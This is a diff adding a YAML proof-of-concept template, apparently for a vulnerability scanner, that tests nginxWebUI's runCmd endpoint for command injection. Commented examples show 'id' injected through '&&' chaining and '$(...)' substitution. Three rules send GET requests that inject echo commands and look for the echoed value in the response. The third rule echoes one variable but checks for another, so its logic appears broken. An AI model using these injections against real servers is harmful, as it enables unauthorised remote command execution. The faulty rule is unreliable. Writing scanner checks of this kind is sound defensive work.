@@ -1,0 +1,35 @@
+name: poc-yaml-nginxwebui-rce
+#/AdminPage/conf/runCmd?cmd=id     运行失败  <br>output<br>
+#/AdminPage/conf/runCmd?cmd=id%26%26nginx                                             运行失败   <br>output<br>
+#/AdminPage/conf/runCmd?cmd=nginx%20-h%20%22$(id%20)%22              运行失败              <br>output<br>
+
+detail:
+  author: yesha
+  links:
+    - https://yesha.com
+  vulnerability:
+    level: critical
+transport: http
+set:
+  s1: randomInt(1000, 9999)
+  s2: string("nginx_") + randomLowercase(5)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /AdminPage/conf/runCmd?cmd=echo%20{{s1}}%26%26nginx   
+      follow_redirects: false
+    expression: response.body_string.contains(string(s1)) && response.body_string.contains("运行失败")
+  r1:
+    request:
+      method: GET
+      path: /AdminPage/conf/runCmd?cmd=nginx%20-h%20%22$(echo%20{{s1}}%20)%22 
+      follow_redirects: false
+    expression: response.body_string.contains(string(s1)) && response.body_string.contains("运行失败")
+  r2:
+    request:
+      method: GET
+      path: /AdminPage/conf/runCmd?cmd=echo%20{{s2}} 
+      follow_redirects: false
+    expression: response.body_string.contains(string(s1)) && response.body_string.contains("运行失败")
+expression: r0() || r1() || r2()
